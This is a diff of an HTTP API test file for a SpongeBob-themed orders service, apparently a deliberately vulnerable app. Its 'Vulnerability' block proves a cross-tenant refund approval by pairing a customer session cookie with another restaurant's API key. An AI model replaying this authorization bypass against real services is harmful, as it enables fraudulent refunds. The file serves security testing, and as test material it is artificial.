@@ -1,22 +1,93 @@
+# @import ../helpers.http
 # @import ../common.http
 # @import ./_reset.http
 @base = {{base_host}}/v301
 # @tag spec,v301,orders
 
-### Seed DB
+### Orders listing requires auth
 # @ref seed_balance_v301
+# @noCookieJar
 GET {{base}}/orders
-Authorization: {{plankton_auth}}
 
-?? js response.statusCode == 200
+> {%
+client.test("v301 orders require auth", () => {
+  const status = response.statusCode ?? response.status;
+  if (status < 400) throw new Error(`Expected auth failure, got ${status}`);
+});
+%}
 
-### Dual-auth refund should require proper tenant
+### Manager-only refund status should reject mismatched API key alone
+# @ref seed_balance_v301
+# @noCookieJar
 PATCH {{base}}/orders/1/refund/status
-Authorization: {{plankton_auth}}
-X-API-Key: {{krusty_key}}
+X-API-Key: {{plankton_key}}
 Content-Type: application/x-www-form-urlencoded
 
 status=approved
 
-?? js response.statusCode >= 400
-?? js (response.parsedBody || {}).status !== "approved"
+> {%
+client.test("v301 manager key without ownership rejected", () => {
+  const status = response.statusCode ?? response.status;
+  if (status < 400) throw new Error(`Expected failure for wrong restaurant key, got ${status}`);
+});
+%}
+
+### Login as SpongeBob (order owner) to capture session cookie
+# @name v301_spongebob_session
+# @ref seed_balance_v301
+# @noCookieJar
+POST {{base}}/auth/login
+Content-Type: application/json
+
+{
+  "email": "spongebob@bikinibottom.sea",
+  "password": "i_l0ve_burg3rs"
+}
+
+?? js response.statusCode == 200
+
+> {%
+const helperStore = (typeof $global !== "undefined" && $global) || {};
+let captureCookie = helperStore.captureCookie || (client.global.get("helpers") || {}).captureCookie;
+if (typeof captureCookie !== "function") {
+  const headers = (response?.headers?.headers) || (response?.headers) || {};
+  captureCookie = (resp, key) => {
+    const raw = headers["set-cookie"] || headers["Set-Cookie"];
+    const cookie = Array.isArray(raw) ? raw.join("; ") : raw;
+    if (!cookie) throw new Error("helpers not initialized");
+    client.global.set(key, cookie);
+    return cookie;
+  };
+}
+captureCookie(response, "v301_spongebob_cookie");
+%}
+
+### Vulnerability: customer cookie + foreign restaurant key approves refund
+# @ref v301_spongebob_session
+# @noCookieJar
+PATCH {{base}}/orders/1/refund/status
+Cookie: {{v301_spongebob_cookie}}
+X-API-Key: {{plankton_key}}
+Content-Type: application/x-www-form-urlencoded
+
+status=approved
+
+> {%
+const helpersRef = client.global.get("helpers") || globalThis.helpers || {};
+client.test("v301 dual-auth confusion approves cross-tenant refund", () => {
+  const status = response.statusCode ?? response.status;
+  if (status !== 200) throw new Error(`Expected 200, got ${status}`);
+  const body = helpersRef.parseBody(response);
+  if ((body.status || "").toLowerCase() !== "approved") {
+    throw new Error("Refund not approved despite mixed auth");
+  }
+});
+%}
+
+### Customer-only refund status read
+# @ref v301_spongebob_session
+# @noCookieJar
+GET {{base}}/orders/1/refund/status
+Cookie: {{v301_spongebob_cookie}}
+
+?? js response.statusCode == 200
